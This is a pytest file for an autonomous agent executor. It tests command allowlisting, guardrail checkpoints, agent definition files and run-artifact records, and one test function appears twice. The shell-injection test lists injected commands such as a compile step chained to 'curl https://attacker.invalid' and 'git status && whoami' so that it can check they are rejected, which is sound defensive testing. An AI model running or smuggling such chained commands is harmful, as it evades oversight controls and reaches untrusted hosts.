from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
AUTONOMY_SCRIPTS = ROOT / "scripts" / "autonomy"
if str(AUTONOMY_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(AUTONOMY_SCRIPTS))
MODULE_PATH = ROOT / "scripts" / "autonomy" / "hosted_llm_executor.py"
SPEC = importlib.util.spec_from_file_location("hosted_llm_executor", MODULE_PATH)
MODULE = importlib.util.module_from_spec(SPEC)
assert SPEC is not None and SPEC.loader is not None
SPEC.loader.exec_module(MODULE)
RUN_ARTIFACTS_PATH = ROOT / "scripts" / "autonomy" / "run_artifacts.py"
RUN_ARTIFACTS_SPEC = importlib.util.spec_from_file_location("run_artifacts", RUN_ARTIFACTS_PATH)
RUN_ARTIFACTS = importlib.util.module_from_spec(RUN_ARTIFACTS_SPEC)
assert RUN_ARTIFACTS_SPEC is not None and RUN_ARTIFACTS_SPEC.loader is not None
RUN_ARTIFACTS_SPEC.loader.exec_module(RUN_ARTIFACTS)


# ---------------------------------------------------------------------------
# Shell-injection guard
# ---------------------------------------------------------------------------

def test_validate_commands_rejects_shell_injection() -> None:
    commands = [
        "python -m compileall src/api; curl https://attacker.invalid",
        "git status && whoami",
        "echo harmless",
    ]

    assert MODULE.validate_commands(commands) == []


def test_validate_commands_accepts_expected_commands() -> None:
    commands = [
        "python -m compileall src/api",
        "git status",
        "git diff",
        "npm test",
    ]

    assert MODULE.validate_commands(commands) == [
        ["python", "-m", "compileall", "src/api"],
        ["git", "status"],
        ["git", "diff"],
    ]


def test_split_validation_commands_reports_rejections() -> None:
    requested, allowed, rejected = MODULE.split_validation_commands(
        [
            "python -m compileall src/api",
            "git status",
            "echo harmless",
            {"unexpected": "shape"},
        ]
    )

    assert requested == [
        "python -m compileall src/api",
        "git status",
        "echo harmless",
    ]
    assert allowed == [
        ["python", "-m", "compileall", "src/api"],
        ["git", "status"],
    ]
    assert rejected == ["echo harmless", "{'unexpected': 'shape'}"]


def test_enforce_validation_guardrails_rejects_non_allowlisted_commands(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.chdir(tmp_path)
    checkpoint_records = []
    requested, allowed, rejected = MODULE.split_validation_commands(
        ["python -m compileall src/api", "echo harmless"]
    )

    with pytest.raises(RuntimeError) as exc_info:
        MODULE.enforce_validation_guardrails(
            requested_commands=requested,
            validation_commands=allowed,
            rejected_commands=rejected,
            checkpoint_records=checkpoint_records,
            run_json_path=None,
            agent_id="qa-reliability-engineer",
            session_id="run-123",
        )

    assert "outside the executor allowlist" in str(exc_info.value)
    payload = json.loads((tmp_path / ".autonomy" / "guardrail-failure.json").read_text())
    assert payload["reason"] == "validation_checkpoint_denied"
    assert payload["details"]["checkpoint"]["decision"] == "deny"


def test_enforce_validation_guardrails_rejects_too_many_commands(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.chdir(tmp_path)
    checkpoint_records = []
    requested, allowed, rejected = MODULE.split_validation_commands(
        [
            "python -m compileall src/api",
            "git status",
            "git diff",
            "python -m compileall src/security",
        ]
    )

    with pytest.raises(RuntimeError) as exc_info:
        MODULE.enforce_validation_guardrails(
            requested_commands=requested,
            validation_commands=allowed,
            rejected_commands=rejected,
            checkpoint_records=checkpoint_records,
            run_json_path=None,
            agent_id="qa-reliability-engineer",
            session_id="run-124",
        )

    assert "exceeds the max of 3" in str(exc_info.value)
    payload = json.loads((tmp_path / ".autonomy" / "guardrail-failure.json").read_text())
    assert payload["details"]["max_validation_commands"] == 3


def test_enforce_patch_guardrails_records_policy_checkpoint(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.chdir(tmp_path)
    checkpoint_records = []

    MODULE.enforce_patch_guardrails(
        "",
        checkpoint_records=checkpoint_records,
        run_json_path=None,
        agent_id="control-plane-steward",
        session_id="run-456",
    )

    checkpoint_payload = json.loads((tmp_path / ".autonomy" / "policy-checkpoints.json").read_text())
    assert checkpoint_payload[0]["checkpoint"] == "autonomy.patch.apply"
    assert checkpoint_payload[0]["decision"] == "allow"


# ---------------------------------------------------------------------------
# Agent context file invariants
# ---------------------------------------------------------------------------

def test_all_agent_dirs_have_uppercase_agent_md() -> None:
    """Regression: executor loads AGENT.md (uppercase). Git index must match."""
    agents_dir = ROOT / "agents"
    assert agents_dir.exists(), "agents/ directory not found"

    result = subprocess.run(
        ["git", "ls-files", "agents/"],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    tracked = result.stdout.splitlines()

    agent_dirs = [d for d in (agents_dir).iterdir() if d.is_dir() and not d.name.startswith('.')]

    for agent_dir in agent_dirs:
        git_index_entries = [f for f in tracked if f.startswith(f"agents/{agent_dir.name}/")]
        file_names = {Path(f).name for f in git_index_entries}

        # The executor looks for AGENT.md (uppercase) first, falls back to agent.md
        assert "AGENT.md" in file_names, (
            f"agents/{agent_dir.name}/AGENT.md not found in git index. "
            f"Executor requires uppercase AGENT.md. Found: {file_names}"
        )

        # Warn if lowercase agent.md also exists (duplicate on case-insensitive FS)
        if "agent.md" in file_names:
            pytest.fail(
                f"agents/{agent_dir.name}/agent.md (lowercase) exists alongside AGENT.md. "
                f"On case-insensitive filesystems these are the same file. "
                f"Remove the lowercase variant and rename to AGENT.md."
            )


def test_no_lowercase_agent_md_in_git_index() -> None:
    """Verify the git index has no lowercase agent.md entries."""
    result = subprocess.run(
        ["git", "ls-files", "--", "agents/"],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    lines = result.stdout.splitlines()

    bad = [line for line in lines if "/agent.md" in line and "/AGENT.md" not in line]
    assert not bad, (
        f"Git index contains lowercase agent.md entries (should be AGENT.md): {bad}"
    )


def test_agents_md_resolvable_by_executor() -> None:
    """Verify the executor can resolve AGENTS.md and agents-1.md fallback."""
    # AGENTS.md must exist at root
    assert (ROOT / "AGENTS.md").exists(), "AGENTS.md not found at repo root"

    # agents-1.md must exist (stub or real — executor falls back to it)
    assert (ROOT / "agents-1.md").exists(), "agents-1.md not found (executor fallback)"


def test_build_prompt_raises_for_missing_agent() -> None:
    """Verify build_prompt fails loudly when agent definition is absent."""
    with pytest.raises(FileNotFoundError) as exc_info:
        MODULE.build_prompt(
            agent="nonexistent-agent",
            brief_text="test brief",
            work_order={"files": []},
        )
    assert "nonexistent-agent" in str(exc_info.value)
    assert "AGENT.md" in str(exc_info.value)


def test_build_prompt_raises_for_missing_agent() -> None:
    """Verify build_prompt fails loudly when agent definition is absent."""
    with pytest.raises(FileNotFoundError) as exc_info:
        MODULE.build_prompt(
            agent="nonexistent-agent",
            brief_text="test brief",
            work_order={"files": []},
        )
    assert "nonexistent-agent" in str(exc_info.value)
    assert "AGENT.md" in str(exc_info.value)


def test_initialize_run_artifact_creates_schema_bundle(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.chdir(tmp_path)
    work_order = {
        "issue": 17,
        "title": "Capture run artifacts",
        "url": "https://example.invalid/issues/17",
        "labels": ["autonomy:ready", "area:docs"],
        "agent": "docs-drift-curator",
        "reviewer": "qa-reliability-engineer",
        "lane": "codex",
        "branch": "autonomy/docs/issue-17-capture-run-artifacts",
        "acceptance": "Document the run artifact schema.",
    }
    work_order_path = tmp_path / "autonomy-work-order.json"
    work_order_path.write_text(json.dumps(work_order) + "\n")
    brief_path = tmp_path / ".autonomy" / "briefs" / "issue-17.md"
    brief_path.parent.mkdir(parents=True, exist_ok=True)
    brief_path.write_text("# Work Order 17\n")

    run_json_path = RUN_ARTIFACTS.initialize_run_artifact(
        work_order,
        work_order_path,
        brief_path,
        base_branch="main",
    )

    payload = json.loads(run_json_path.read_text())
    assert payload["schema_version"] == RUN_ARTIFACTS.RUN_SCHEMA_VERSION
    assert payload["params"]["issue"] == 17
    assert payload["verification"]["status"] == "pending"
    assert payload["provenance"]["capture_mode"] == "local-first"
    assert {artifact["name"] for artifact in payload["artifacts"]} == {"work_order", "brief"}
    assert (run_json_path.parent / "inputs" / "work-order.json").exists()
    assert (run_json_path.parent / "inputs" / "brief.md").exists()


def test_record_verification_results_marks_failure(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    work_order = {
        "issue": 18,
        "title": "Record verification failure",
        "labels": ["autonomy:ready", "area:test"],
        "agent": "qa-reliability-engineer",
        "reviewer": "control-plane-steward",
        "lane": "codex",
        "branch": "autonomy/test/issue-18-record-verification-failure",
        "acceptance": "Persist verification results in the run schema.",
    }
    work_order_path = tmp_path / "autonomy-work-order.json"
    work_order_path.write_text(json.dumps(work_order) + "\n")
    brief_path = tmp_path / ".autonomy" / "briefs" / "issue-18.md"
    brief_path.parent.mkdir(parents=True, exist_ok=True)
    brief_path.write_text("# Work Order 18\n")
    run_json_path = RUN_ARTIFACTS.initialize_run_artifact(
        work_order,
        work_order_path,
        brief_path,
        base_branch="main",
    )

    stdout_artifact = RUN_ARTIFACTS.write_text_artifact(
        run_json_path,
        name="verification_1_stdout",
        kind="log",
        relative_path="verification/01.stdout.log",
        content="compileall failed\n",
    )
    RUN_ARTIFACTS.record_verification_results(
        run_json_path,
        commands=[["python3", "-m", "compileall", "scripts/autonomy"]],
        results=[
            {
                "argv": ["python3", "-m", "compileall", "scripts/autonomy"],
                "status": "failed",
                "exit_code": 1,
                "started_at": "2026-04-04T00:00:00Z",
                "finished_at": "2026-04-04T00:00:01Z",
                "stdout_artifact": stdout_artifact["path"],
            }
        ],
    )

    payload = json.loads(run_json_path.read_text())
    assert payload["verification"]["status"] == "failed"
    assert payload["verification"]["commands"] == ["python3 -m compileall scripts/autonomy"]
    assert payload["verification"]["results"][0]["stdout_artifact"] == "verification/01.stdout.log"
